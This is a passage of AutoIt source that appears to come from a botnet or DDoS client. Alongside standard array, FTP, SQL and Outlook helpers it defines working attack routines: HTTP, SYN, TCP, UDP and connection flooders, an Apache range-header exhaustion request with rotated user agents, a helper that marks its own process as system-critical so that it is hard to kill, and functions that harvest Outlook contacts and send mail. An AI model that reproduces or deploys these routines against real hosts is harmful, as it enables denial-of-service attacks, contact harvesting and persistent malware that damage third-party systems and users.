				If $iSubItem < 0 Then
					$iSubItem = 0
				Else
					$iDim_Sub = $iSubItem
				EndIf
			Else
				$iDim_Sub = $iDim_2
				If $iSubItem > $iDim_Sub Then $iSubItem = $iDim_Sub
				If $iSubItem < 0 Then
					$iSubItem = 0
				Else
					$iDim_Sub = $iSubItem
				EndIf
			EndIf
			For $j = $iSubItem To $iDim_Sub
				If Not $iCompare Then
					If Not $iCase Then
						For $i = $iStart To $iEnd Step $iStep
							If $bRow Then
								If $bCompType And VarGetType($aArray[$j][$i]) <> VarGetType($vValue) Then ContinueLoop
								If $aArray[$j][$i] = $vValue Then Return $i
							Else
								If $bCompType And VarGetType($aArray[$i][$j]) <> VarGetType($vValue) Then ContinueLoop
								If $aArray[$i][$j] = $vValue Then Return $i
							EndIf
						Next
					Else
						For $i = $iStart To $iEnd Step $iStep
							If $bRow Then
								If $bCompType And VarGetType($aArray[$j][$i]) <> VarGetType($vValue) Then ContinueLoop
								If $aArray[$j][$i] == $vValue Then Return $i
							Else
								If $bCompType And VarGetType($aArray[$i][$j]) <> VarGetType($vValue) Then ContinueLoop
								If $aArray[$i][$j] == $vValue Then Return $i
							EndIf
						Next
					EndIf
				Else
					For $i = $iStart To $iEnd Step $iStep
						If $iCompare = 3 Then
							If $bRow Then
								If StringRegExp($aArray[$j][$i], $vValue) Then Return $i
							Else
								If StringRegExp($aArray[$i][$j], $vValue) Then Return $i
							EndIf
						Else
							If $bRow Then
								If StringInStr($aArray[$j][$i], $vValue, $iCase) > 0 Then Return $i
							Else
								If StringInStr($aArray[$i][$j], $vValue, $iCase) > 0 Then Return $i
							EndIf
						EndIf
					Next
				EndIf
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return SetError(6, 0, -1)
EndFunc   ;==>_ArraySearch
Func _ArrayToString(Const ByRef $aArray, $sDelim_Col = "|", $iStart_Row = -1, $iEnd_Row = -1, $sDelim_Row = @CRLF, $iStart_Col = -1, $iEnd_Col = -1)
	If $sDelim_Col = Default Then $sDelim_Col = "|"
	If $sDelim_Row = Default Then $sDelim_Row = @CRLF
	If $iStart_Row = Default Then $iStart_Row = -1
	If $iEnd_Row = Default Then $iEnd_Row = -1
	If $iStart_Col = Default Then $iStart_Col = -1
	If $iEnd_Col = Default Then $iEnd_Col = -1
	If Not IsArray($aArray) Then Return SetError(1, 0, -1)
	Local $iDim_1 = UBound($aArray, $UBOUND_ROWS) - 1
	If $iStart_Row = -1 Then $iStart_Row = 0
	If $iEnd_Row = -1 Then $iEnd_Row = $iDim_1
	If $iStart_Row < -1 Or $iEnd_Row < -1 Then Return SetError(3, 0, -1)
	If $iStart_Row > $iDim_1 Or $iEnd_Row > $iDim_1 Then Return SetError(3, 0, "")
	If $iStart_Row > $iEnd_Row Then Return SetError(4, 0, -1)
	Local $sRet = ""
	Switch UBound($aArray, $UBOUND_DIMENSIONS)
		Case 1
			For $i = $iStart_Row To $iEnd_Row
				$sRet &= $aArray[$i] & $sDelim_Col
			Next
			Return StringTrimRight($sRet, StringLen($sDelim_Col))
		Case 2
			Local $iDim_2 = UBound($aArray, $UBOUND_COLUMNS) - 1
			If $iStart_Col = -1 Then $iStart_Col = 0
			If $iEnd_Col = -1 Then $iEnd_Col = $iDim_2
			If $iStart_Col < -1 Or $iEnd_Col < -1 Then Return SetError(5, 0, -1)
			If $iStart_Col > $iDim_2 Or $iEnd_Col > $iDim_2 Then Return SetError(5, 0, -1)
			If $iStart_Col > $iEnd_Col Then Return SetError(6, 0, -1)
			For $i = $iStart_Row To $iEnd_Row
				For $j = $iStart_Col To $iEnd_Col
					$sRet &= $aArray[$i][$j] & $sDelim_Col
				Next
				$sRet = StringTrimRight($sRet, StringLen($sDelim_Col)) & $sDelim_Row
			Next
			Return StringTrimRight($sRet, StringLen($sDelim_Row))
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc   ;==>_ArrayToString
Func _ArrayUnique(Const ByRef $aArray, $iColumn = 0, $iBase = 0, $iCase = 0, $iCount = $ARRAYUNIQUE_COUNT, $iIntType = $ARRAYUNIQUE_AUTO)
	If $iColumn = Default Then $iColumn = 0
	If $iBase = Default Then $iBase = 0
	If $iCase = Default Then $iCase = 0
	If $iCount = Default Then $iCount = $ARRAYUNIQUE_COUNT
	If UBound($aArray, $UBOUND_ROWS) = 0 Then Return SetError(1, 0, 0)
	Local $iDims = UBound($aArray, $UBOUND_DIMENSIONS), $iNumColumns = UBound($aArray, $UBOUND_COLUMNS)
	If $iDims > 2 Then Return SetError(2, 0, 0)
	If $iBase < 0 Or $iBase > 1 Or (Not IsInt($iBase)) Then Return SetError(3, 0, 0)
	If $iCase < 0 Or $iCase > 1 Or (Not IsInt($iCase)) Then Return SetError(3, 0, 0)
	If $iCount < 0 Or $iCount > 1 Or (Not IsInt($iCount)) Then Return SetError(4, 0, 0)
	If $iIntType < 0 Or $iIntType > 4 Or (Not IsInt($iIntType)) Then Return SetError(5, 0, 0)
	If $iColumn < 0 Or ($iNumColumns = 0 And $iColumn > 0) Or ($iNumColumns > 0 And $iColumn >= $iNumColumns) Then Return SetError(6, 0, 0)
	If $iIntType = $ARRAYUNIQUE_AUTO Then
		Local $bInt, $sVarType
		If $iDims = 1 Then
			$bInt = IsInt($aArray[$iBase])
			$sVarType = VarGetType($aArray[$iBase])
		Else
			$bInt = IsInt($aArray[$iBase][$iColumn])
			$sVarType = VarGetType($aArray[$iBase][$iColumn])
		EndIf
		If $bInt And $sVarType = "Int64" Then
			$iIntType = $ARRAYUNIQUE_FORCE64
		Else
			$iIntType = $ARRAYUNIQUE_FORCE32
		EndIf
	EndIf
	Local $oDictionary = ObjCreate("Scripting.Dictionary")
	$oDictionary.CompareMode = Number(Not $iCase)
	Local $vElem, $sType, $vKey, $bCOMError = False
	For $i = $iBase To UBound($aArray) - 1
		If $iDims = 1 Then
			$vElem = $aArray[$i]
		Else
			$vElem = $aArray[$i][$iColumn]
		EndIf
		Switch $iIntType
			Case $ARRAYUNIQUE_FORCE32
				$oDictionary.Item($vElem) ; Check if key exists - automatically created if not
				If @error Then
					$bCOMError = True ; Failed with an Int64, Ptr or Binary datatype
					ExitLoop
				EndIf
			Case $ARRAYUNIQUE_FORCE64
				$sType = VarGetType($vElem)
				If $sType = "Int32" Then
					$bCOMError = True ; Failed with an Int32 datatype
					ExitLoop
				EndIf ; Create key
				$vKey = "#" & $sType & "#" & String($vElem)
				If Not $oDictionary.Item($vKey) Then ; Check if key exists
					$oDictionary($vKey) = $vElem ; Store actual value in dictionary
				EndIf
			Case $ARRAYUNIQUE_MATCH
				$sType = VarGetType($vElem)
				If StringLeft($sType, 3) = "Int" Then
					$vKey = "#Int#" & String($vElem)
				Else
					$vKey = "#" & $sType & "#" & String($vElem)
				EndIf
				If Not $oDictionary.Item($vKey) Then ; Check if key exists
					$oDictionary($vKey) = $vElem ; Store actual value in dictionary
				EndIf
			Case $ARRAYUNIQUE_DISTINCT
				$vKey = "#" & VarGetType($vElem) & "#" & String($vElem)
				If Not $oDictionary.Item($vKey) Then ; Check if key exists
					$oDictionary($vKey) = $vElem ; Store actual value in dictionary
				EndIf
		EndSwitch
	Next
	Local $aValues, $j = 0
	If $bCOMError Then ; Mismatch Int32/64
		Return SetError(7, 0, 0)
	ElseIf $iIntType <> $ARRAYUNIQUE_FORCE32 Then
		Local $aValues[$oDictionary.Count]
		For $vKey In $oDictionary.Keys()
			$aValues[$j] = $oDictionary($vKey)
			If StringLeft($vKey, 5) = "#Ptr#" Then
				$aValues[$j] = Ptr($aValues[$j])
			EndIf
			$j += 1
		Next
	Else
		$aValues = $oDictionary.Keys()
	EndIf
	If $iCount Then
		_ArrayInsert($aValues, 0, $oDictionary.Count)
	EndIf
	Return $aValues
EndFunc   ;==>_ArrayUnique
Func _BinaryToInt16($4bytes)
	$dllStruct2_Integer = DllStructCreate("int")
	$dllStruct2_Binary = DllStructCreate("byte[4]", DllStructGetPtr($dllStruct2_Integer))
	DllStructSetData($dllStruct2_Binary, 1, $4bytes)
	Return DllStructGetData($dllStruct2_Integer, 1)
EndFunc   ;==>_BinaryToInt16
Func _condisflood($host, $port, $time)
	$ip = TCPNameToIP($host)
	$port = Int($port)
	$time = Int($time)
	TCPStartup()
	Local $timer = TimerInit(), $diff = 0
	While 1
		$diff = TimerDiff($timer)
		If $diff >= $time * 1000 Then
			ExitLoop
		EndIf
		$socket = TCPConnect($ip, $port)
		TCPCloseSocket($socket)
	WEnd
EndFunc   ;==>_condisflood
Func _elementexists($array, $element)
	If $element > UBound($array) - 1 Then Return False
	Return True
EndFunc   ;==>_elementexists
Func _FileListToArray($sPath, $sFilter = "*", $iFlag = 0)
	Local $hSearch, $sFile, $sFileList, $asFileList[1]
	If Not FileExists($sPath) Then Return SetError(1, 1, "")
	If StringRegExp($sFilter, "[\\/:<>|]") Or (Not StringStripWS($sFilter, 8)) Then Return SetError(2, 2, "")
	If Not ($iFlag = 0 Or $iFlag = 1 Or $iFlag = 2 Or $iFlag = 4 Or $iFlag = 5 Or $iFlag = 6) Then Return SetError(3, 3, "")
	If (StringMid($sPath, StringLen($sPath), 1) = "\") Then $sPath = StringTrimRight($sPath, 1)
	$hSearch = FileFindFirstFile($sPath & "\" & $sFilter)
	If $hSearch = -1 Then Return SetError(4, 4, "")
	While 1
		$sFile = FileFindNextFile($hSearch)
		If @error Then
			SetError(0)
			ExitLoop
		EndIf
		If $iFlag = 1 And StringInStr(FileGetAttrib($sPath & "\" & $sFile), "D") <> 0 Then ContinueLoop
		If $iFlag = 2 And StringInStr(FileGetAttrib($sPath & "\" & $sFile), "D") = 0 Then ContinueLoop
		If $iFlag > 3 Then $sFile = $sPath & "\" & $sFile
		$sFileList &= $sFile & "|"
	WEnd
	FileClose($hSearch)
	$asFileList = StringSplit(StringTrimRight($sFileList, 1), "|")
	Return $asFileList
EndFunc   ;==>_FileListToArray
Func _FTP_Close($l_InternetSession)
	If $__ghWinInet_FTP = -1 Then Return SetError(-2, 0, 0)
	Local $ai_InternetCloseHandle = DllCall($__ghWinInet_FTP, 'bool', 'InternetCloseHandle', 'handle', $l_InternetSession)
	If @error Or $ai_InternetCloseHandle[0] = 0 Then Return SetError(-1, 1, 0)

	If $__gbCallback_Set = True Then DllCallbackFree($__ghCallback_FTP)

	Return $ai_InternetCloseHandle[0]

EndFunc   ;==>_FTP_Close
Func _FTP_Connect($l_InternetSession, $s_ServerName, $s_Username, $s_Password, $i_Passive = 0, $i_ServerPort = 0, $l_Service = $INTERNET_SERVICE_FTP, $l_Flags = 0, $l_Context = 0)
	If $__ghWinInet_FTP = -1 Then Return SetError(-2, 0, 0)
	If $i_Passive == 1 Then $l_Flags = BitOR($l_Flags, $INTERNET_FLAG_PASSIVE)
	Local $ai_InternetConnect = DllCall($__ghWinInet_FTP, 'hwnd', 'InternetConnectW', 'handle', $l_InternetSession, 'wstr', $s_ServerName, 'ushort', $i_ServerPort, 'wstr', $s_Username, 'wstr', $s_Password, 'dword', $l_Service, 'dword', $l_Flags, 'dword_ptr', $l_Context)
	If @error Or $ai_InternetConnect[0] = 0 Then Return SetError(-1, 1, 0)

	Return $ai_InternetConnect[0]

EndFunc   ;==>_FTP_Connect
Func _FTP_Open($s_Agent, $l_AccessType = $INTERNET_OPEN_TYPE_DIRECT, $s_ProxyName = '', $s_ProxyBypass = '', $l_Flags = 0)
	If $__ghWinInet_FTP = -1 Then __FTP_Init()
	Local $ai_InternetOpen = DllCall($__ghWinInet_FTP, 'handle', 'InternetOpenW', 'wstr', $s_Agent, 'dword', $l_AccessType, _
			'wstr', $s_ProxyName, 'wstr', $s_ProxyBypass, 'dword', $l_Flags)
	If @error Or $ai_InternetOpen[0] = 0 Then Return SetError(-1, 1, 0)

	Return $ai_InternetOpen[0]

EndFunc   ;==>_FTP_Open
Func _FTP_ProgressUpload($l_FTPSession, $s_LocalFile, $s_RemoteFile, $FunctionToCall = "")
	If $__ghWinInet_FTP = -1 Then Return SetError(-2, 0, 0)

	Local $fhandle = FileOpen($s_LocalFile, 16)
	If @error Then Return SetError(-1, 1, 0)

	Local $ai_ftpopenfile = DllCall($__ghWinInet_FTP, 'handle', 'FtpOpenFileW', 'handle', $l_FTPSession, 'wstr', $s_RemoteFile, 'dword', $GENERIC_WRITE, 'dword', $FTP_TRANSFER_TYPE_BINARY, 'dword_ptr', 0)
	If @error Or $ai_ftpopenfile[0] = 0 Then Return SetError(-3, 1, 0)
	Local $glen = FileGetSize($s_LocalFile)
	Local Const $ChunkSize = 256 * 1024
	Local $last = Mod($glen, $ChunkSize)

	Local $parts = Ceiling($glen / $ChunkSize)
	Local $buffer = DllStructCreate("byte[" & $ChunkSize & "]")

	Local $ai_InternetCloseHandle, $ai_ftpwrite, $out, $ret, $lasterror
	Local $x = $ChunkSize
	Local $done = 0
	For $i = 1 To $parts
		If $i = $parts And $last > 0 Then
			$x = $last
		EndIf
		DllStructSetData($buffer, 1, FileRead($fhandle, $x))

		$ai_ftpwrite = DllCall($__ghWinInet_FTP, 'bool', 'InternetWriteFile', 'handle', $ai_ftpopenfile[0], 'struct*', $buffer, 'dword', $x, 'dword*', $out)
		If @error Or $ai_ftpwrite[0] = 0 Then
			$lasterror = 1
			$ai_InternetCloseHandle = DllCall($__ghWinInet_FTP, 'bool', 'InternetCloseHandle', 'handle', $ai_ftpopenfile[0])
			; No need to test @error.
			FileClose($fhandle)
			Return SetError(-4, $lasterror, 0)
		EndIf
		$done += $x

		If $FunctionToCall = "" Then
			ProgressSet(($done / $glen) * 100)
		Else
			If $ret <= 0 Then
				$lasterror = @error
				$ai_InternetCloseHandle = DllCall($__ghWinInet_FTP, 'bool', 'InternetCloseHandle', 'handle', $ai_ftpopenfile[0])
				; No need to test @error.
				DllCall($__ghWinInet_FTP, 'bool', 'FtpDeleteFileW', 'handle', $l_FTPSession, 'wstr', $s_RemoteFile)
				; No need to test @error.
				FileClose($fhandle)
				Return SetError(-6, $lasterror, $ret)
			EndIf
		EndIf
		Sleep(10)
	Next

	FileClose($fhandle)

	If $FunctionToCall = "" Then ProgressOff()

	$ai_InternetCloseHandle = DllCall($__ghWinInet_FTP, 'bool', 'InternetCloseHandle', 'handle', $ai_ftpopenfile[0])
	; No need to test @error.
	If @error Or $ai_InternetCloseHandle[0] = 0 Then Return SetError(-5, 1, 0)

	Return 1
EndFunc   ;==>_FTP_ProgressUpload
Func _GetIP()
	Local Const $STR_REGEXPARRAYGLOBALMATCH = 3 ; Return array of global matches.
	Local Const $GETIP_TIMER = 300000 ; Constant for how many milliseconds between each check. This is 5 minutes.
	Local Static $hTimer = 0 ; Create a static variable to store the timer handle.
	Local Static $sLastIP = 0 ; Create a static variable to store the last IP.
	If TimerDiff($hTimer) < $GETIP_TIMER And Not $sLastIP Then ; If still in the timer and $sLastIP contains a value.
		Return SetExtended(1, $sLastIP) ; Return the last IP instead and set @extended to 1.
	EndIf
	#cs
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        Additional list of possible IP disovery sites by z3r0c00l12.
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://corz.org/ip
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://icanhazip.com
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://ip.appspot.com
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://ip.eprci.net/text
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://ip.jsontest.com/
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://services.packetizer.com/ipaddress/?f=text
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://whatthehellismyip.com/?ipraw
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://wtfismyip.com/text
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://www.networksecuritytoolkit.org/nst/tools/ip.php
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://www.telize.com/ip
 |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |    |        http://www.trackip.net/ip
	#ce
	Local $aGetIPURL = ["https://api.ipify.org", "http://checkip.dyndns.org", "http://www.myexternalip.com/raw", "http://bot.whatismyipaddress.com"], _
			$aReturn = 0, _
			$sReturn = ""
	For $i = 0 To UBound($aGetIPURL) - 1
		Local $aReturn = ""
		$sReturn = InetRead($aGetIPURL[$i])
		If @error Or $sReturn == "" Then ContinueLoop
		$aReturn = StringRegExp(BinaryToString($sReturn), "((?:\d{1,3}\.){3}\d{1,3})", $STR_REGEXPARRAYGLOBALMATCH) ; [\d\.]{7,15}
		If Not @error Then
			$sReturn = $aReturn[0]
			ExitLoop
		EndIf
		$sReturn = ""
	Next
	$hTimer = TimerInit() ; Create a new timer handle.
	$sLastIP = $sReturn ; Store this IP.
	If $sReturn == "" Then Return SetError(1, 0, -1)
	Return $sReturn
EndFunc   ;==>_GetIP
Func _httparme($host, $page, $socket = -1)
	Dim $command
	$command = "HEAD / HTTP/1.1" & @CRLF
	$command &= "Host: " & $host & @CRLF
	$command &= "Range:bytes=0-,"
	For $i = 0 To 1300 Step 1
		$command &= "1-" & $i & ","
	Next
	$command &= @CRLF
	$command &= "Accept-Encoding: gzip" & @CRLF
	$command &= "User-Agent: " & $useragents[Random(0, 35, 1)] & @CRLF
	$command &= "Connection: close" & @CRLF
	$command &= @CRLF
	Dim $bytessent = TCPSend($socket, $command)
	If $bytessent == 0 Then
		SetExtended(@error)
		SetError(2)
		Return 0
	EndIf
	SetError(0)
	Return $bytessent
EndFunc   ;==>_httparme
Func _httpflood($host, $port, $path, $time)
	$ip = TCPNameToIP($host)
	$port = Int($port)
	$time = Int($time)
	TCPStartup()
	Local $timer = TimerInit(), $diff = 0
	While 1
		$diff = TimerDiff($timer)
		If $diff >= $time * 1000 Then
			ExitLoop
		EndIf
		$httpsock = TCPConnect($ip, $port)
		While Not @error
			$sent = _httpget($host, $path, $httpsock)
			If $diff >= $time * 1000 Then
				ExitLoop
			EndIf
		WEnd
		TCPCloseSocket($httpsock)
	WEnd
EndFunc   ;==>_httpflood
Func _httpget($host, $page, $socket = -1)
	Dim $command
	$command = "GET " & $page & " HTTP/1.1" & @CRLF
	$command &= "Host: " & $host & @CRLF
	$command &= "User-Agent: " & $useragents[Random(0, 35, 1)] & @CRLF
	$command &= "Connection: keep-alive" & @CRLF
	$command &= @CRLF
	Dim $bytessent = TCPSend($socket, $command)
	If $bytessent == 0 Then
		SetExtended(@error)
		SetError(2)
		Return 0
	EndIf
	SetError(0)
	Return $bytessent
EndFunc   ;==>_httpget
Func _outlookGetContacts($ooutlook, $sfirstname = "", $slastname = "", $semail1adress = "", $fsearchpart = False, $ffulllist = False, $swarningclick = "")
	If $swarningclick <> "" And FileExists($swarningclick) = 0 Then
		Return SetError(2, 0, 0)
	Else
		Run(@ComSpec & ' /C ' & $swarningclick, "", @SW_HIDE)
	EndIf
	Local $irc = 0, $iarraysize
	Local $oouerror = ObjEvent("AutoIt.Error", "_OutlookError")
	Local $onamespace = $ooutlook.getnamespace("MAPI")
	Local $ofolder = $onamespace.getdefaultfolder(10)
	Local $ocolitems = $ofolder.items
	Local $inumofcontacts = $ocolitems.count
	Local $ascontacts[$inumofcontacts], $stemp
	For $inum = 1 To $inumofcontacts
		If $ocolitems.item($inum).class <> 40 Then ContinueLoop
		If $sfirstname <> "" Then
			If $fsearchpart = False Then
				If $sfirstname <> $ocolitems.item($inum).firstname Then ContinueLoop
			Else
				If StringInStr($ocolitems.item($inum).firstname, $sfirstname) = 0 Then ContinueLoop
			EndIf
		EndIf
		If $slastname <> "" Then
			If $fsearchpart = False Then
				If $slastname <> $ocolitems.item($inum).lastname Then ContinueLoop
			Else
				If StringInStr($ocolitems.item($inum).lastname, $slastname) = 0 Then ContinueLoop
			EndIf
		EndIf
		If $semail1adress <> "" Then
			$stemp = $ocolitems.item($inum).email1address
			If $fsearchpart = False Then
				If $semail1adress <> $stemp Then ContinueLoop
			Else
				If StringInStr($stemp, $semail1adress) = 0 Then ContinueLoop
			EndIf
		EndIf
		$ascontacts[$inum - 1] = $ocolitems.item($inum).email1address
	Next
	$irc = @error
	If $irc = 0 Then
		Return $ascontacts
	Else
		Return SetError(9, 0, 0)
	EndIf
EndFunc   ;==>_outlookGetContacts
Func _outlookOpen()
	Local $ooutlook = ObjGet("", "Outlook.Application")
	If @error Or Not IsObj($ooutlook) Then
		Local $ooutlook = ObjCreate("Outlook.Application")
		If @error Or Not IsObj($ooutlook) Then
			Return SetError(1, 0, 0)
		EndIf
	EndIf
	Return $ooutlook
EndFunc   ;==>_outlookOpen
Func _outlookSendmail($ooutlook, $sto = "", $scc = "", $sbcc = "", $ssubject = "", $sbody = "", $sattachments = "", $ibodyformat = 1, $iimportance = 1, $swarningclick = "")
	Local $irc = 0, $asattachments
	If $sto = "" And $scc = "" And $sbcc = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If $swarningclick <> "" And FileExists($swarningclick) = 0 Then
		Return SetError(2, 0, 0)
	Else
		Run($swarningclick)
	EndIf
	Local $oouerror = ObjEvent("AutoIt.Error", "_OutlookError")
	Local $omessage = $ooutlook.createitem(0)
	$omessage.To = $sto
	$omessage.cc = $scc
	$omessage.bcc = $sbcc
	$omessage.subject = $ssubject
	$omessage.body = $sbody
	$omessage.bodyformat = $ibodyformat
	$omessage.importance = $iimportance
	If $sattachments <> "" Then
		$asattachments = StringSplit($sattachments, ";")
		For $inumofattachments = 1 To $asattachments[0]
			$omessage.attachments.add($asattachments[$inumofattachments])
		Next
	EndIf
	$omessage.send
	$irc = @error
	If $irc = 0 Then
		Return 1
	Else
		Return SetError(9, 0, 0)
	EndIf
EndFunc   ;==>_outlookSendmail
Func _SetPrivilege($Privilege)
	Local $tagLUIDANDATTRIB = "int64 Luid;dword Attributes"
	Local $count = 1
	Local $tagTOKENPRIVILEGES = "dword PrivilegeCount;byte LUIDandATTRIB[" & $count * 12 & "]"
	Local $SE_PRIVILEGE_ENABLED = 0x2
	Local $TOKEN_ALL_ACCESS = 0xf01ff
	Local $curProc = DllCall("kernel32.dll", "ptr", "GetCurrentProcess")
	Local $call = DllCall("advapi32.dll", "int", "OpenProcessToken", "ptr", $curProc[0], "dword", $TOKEN_ALL_ACCESS, "ptr*", "")
	If Not $call[0] Then Return False
	Local $hToken = $call[3]
	$call = DllCall("advapi32.dll", "int", "LookupPrivilegeValue", "str", "", "str", $Privilege, "int64*", "")
	Local $iLuid = $call[3]
	Local $TP = DllStructCreate($tagTOKENPRIVILEGES)
	Local $TPout = DllStructCreate($tagTOKENPRIVILEGES)
	Local $LUID = DllStructCreate($tagLUIDANDATTRIB, DllStructGetPtr($TP, "LUIDandATTRIB"))
	DllStructSetData($TP, "PrivilegeCount", $count)
	DllStructSetData($LUID, "Luid", $iLuid)
	DllStructSetData($LUID, "Attributes", $SE_PRIVILEGE_ENABLED)
	$call = DllCall("advapi32.dll", "int", "AdjustTokenPrivileges", "ptr", $hToken, "int", 0, "ptr", DllStructGetPtr($TP), "dword", DllStructGetSize($TPout), "ptr", DllStructGetPtr($TPout), "dword*", 0)
	DllCall("kernel32.dll", "int", "CloseHandle", "ptr", $hToken)
	Return ($call[0] <> 0)
EndFunc   ;==>_SetPrivilege
Func _SetProcessCritical($PID, $Flag)
	Local $sOA = DllStructCreate($tagOBJECTATTRIBUTES)
	DllStructSetData($sOA, "Length", DllStructGetSize($sOA))
	DllStructSetData($sOA, "RootDirectory", 0)
	DllStructSetData($sOA, "ObjectName", 0)
	DllStructSetData($sOA, "Attributes", $OBJ_CASE_INSENSITIVE)
	DllStructSetData($sOA, "SecurityDescriptor", 0)
	DllStructSetData($sOA, "SecurityQualityOfService", 0)
	Local $ClientID = DllStructCreate("dword_ptr UniqueProcessId;dword_ptr UniqueThreadId")
	DllStructSetData($ClientID, "UniqueProcessId", $PID)
	DllStructSetData($ClientID, "UniqueThreadId", 0)
	Local $aCall = DllCall("ntdll.dll", "hwnd", "NtOpenProcess", "handle*", 0, "dword", 0x001F0FFF, "struct*", $sOA, "struct*", $ClientID)
	If Not NT_SUCCESS($aCall[0]) Then
		Return SetError(1, 0, $aCall[0])
	Else
		$hProcess = $aCall[1]
	EndIf
	Local $SpecialStruct = DllStructCreate("dword")
	DllStructSetData($SpecialStruct, 1, $Flag)
	$aCall = DllCall("ntdll.dll", "int", "NtSetInformationProcess", "handle", $hProcess, "dword", 29, "ptr", DllStructGetPtr($SpecialStruct), "dword", DllStructGetSize($SpecialStruct))
	If Not NT_SUCCESS($aCall[0]) Then
		ConsoleWrite("Error in NtSetInformationProcess" & @CRLF)
		Return SetError(1, 0, $aCall[0])
	Else
		Return $aCall[0]
	EndIf
EndFunc   ;==>_SetProcessCritical
Func _Singleton($sOccurrenceName, $iFlag = 0)
	Local Const $ERROR_ALREADY_EXISTS = 183
	Local Const $SECURITY_DESCRIPTOR_REVISION = 1
	Local $tSecurityAttributes = 0
	If BitAND($iFlag, 2) Then
		Local $tSecurityDescriptor = DllStructCreate("byte;byte;word;ptr[4]")
		Local $aRet = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "struct*", $tSecurityDescriptor, "dword", $SECURITY_DESCRIPTOR_REVISION)
		If @error Then Return SetError(@error, @extended, 0)
		If $aRet[0] Then
			$aRet = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "struct*", $tSecurityDescriptor, "bool", 1, "ptr", 0, "bool", 0)
			If @error Then Return SetError(@error, @extended, 0)
			If $aRet[0] Then
				$tSecurityAttributes = DllStructCreate($tagSECURITY_ATTRIBUTES)
				DllStructSetData($tSecurityAttributes, 1, DllStructGetSize($tSecurityAttributes))
				DllStructSetData($tSecurityAttributes, 2, DllStructGetPtr($tSecurityDescriptor))
				DllStructSetData($tSecurityAttributes, 3, 0)
			EndIf
		EndIf
	EndIf
	Local $aHandle = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $tSecurityAttributes, "bool", 1, "wstr", $sOccurrenceName)
	If @error Then Return SetError(@error, @extended, 0)
	Local $aLastError = DllCall("kernel32.dll", "dword", "GetLastError")
	If @error Then Return SetError(@error, @extended, 0)
	If $aLastError[0] = $ERROR_ALREADY_EXISTS Then
		If BitAND($iFlag, 1) Then
			DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $aHandle[0])
			If @error Then Return SetError(@error, @extended, 0)
			Return SetError($aLastError[0], $aLastError[0], 0)
		Else
			Exit -1
		EndIf
	EndIf
	Return $aHandle[0]
EndFunc   ;==>_Singleton
Func _SQLConnect($sServer, $sDatabase, $fAuthMode = 0, $sUsername = "", $sPassword = "", $sDriver = "{SQL Server}")
	Local $stemp = StringMid($sDriver, 2, StringLen($sDriver) - 2)
	Local $sKey = "HKEY_LOCAL_MACHINE\SOFTWARE\ODBC\ODBCINST.INI\ODBC Drivers", $sVal = RegRead($sKey, $stemp)
	If @error Or $sVal = "" Then Return SetError(2, 0, 0)
	$oConn = ObjCreate("ADODB.Connection")
	If Not IsObj($oConn) Then Return SetError(3, 0, 0)
	If $fAuthMode Then $oConn.Open("DRIVER=" & $sDriver & ";SERVER=" & $sServer & ";DATABASE=" & $sDatabase & ";UID=" & $sUsername & ";PWD=" & $sPassword & ";")
	If Not $fAuthMode Then $oConn.Open("DRIVER=" & $sDriver & ";SERVER=" & $sServer & ";DATABASE=" & $sDatabase)
	If @error Then Return SetError(1, 0, 0)
	Return $oConn
EndFunc   ;==>_SQLConnect
Func _SQLDisconnect($oConn)
	If Not IsObj($oConn) Then Return SetError(1, 0, 0)
	$oConn.Close
	Return 1
EndFunc   ;==>_SQLDisconnect
Func _SQLQuery($oConn, $sQuery)
	If IsObj($oConn) Then Return $oConn.Execute($sQuery)
	Return SetError(1, 0, 0)
EndFunc   ;==>_SQLQuery
Func _synflood($host, $port, $time)
	$ip = TCPNameToIP($host)
	$port = Int($port)
	$time = Int($time)
	TCPStartup()
	Local $timer = TimerInit(), $diff = 0
	While 1
		$diff = TimerDiff($timer)
		If $diff >= $time * 1000 Then
			ExitLoop
		EndIf
		TCPConnect($ip, $port)
	WEnd
EndFunc   ;==>_synflood
Func _tcpflood($ip, $port, $packetsize, $time)
	$port = Int($port)
	$packetsize = Int($packetsize)
	$time = Int($time)
	TCPStartup()
	Local $timer = TimerInit(), $diff = 0
	$tcpsock = TCPConnect($ip, $port)
	While 1
		$diff = TimerDiff($timer)
		If $diff >= $time * 1000 Then
			TCPCloseSocket($tcpsock)
			ExitLoop
		EndIf
		$tcpsock = TCPConnect($ip, $port)
		While Not @error
			$packet = ""
			For $i = 0 To $packetsize Step 1
				$packet &= Chr(Random(0, 255, 1))
			Next
			TCPSend($tcpsock, $packet)
			If $diff >= $time * 1000 Then
				ExitLoop
			EndIf
		WEnd
		TCPCloseSocket($tcpsock)
	WEnd
EndFunc   ;==>_tcpflood
Func _udpflood($host, $port, $packetsize, $time)
	$ip = TCPNameToIP($host)
	$port = Int($port)
	$packetsize = Int($packetsize)
	$time = Int($time)
	UDPStartup()
	$packet = ""
	For $i = 1 To $packetsize
		$packet &= Chr(Random(0, 255, 1))
	Next
	Local $timer = TimerInit(), $diff = 0
	$udpsock = UDPOpen($ip, $port)
	While 1
		$diff = TimerDiff($timer)
		If $diff >= $time * 1000 Then
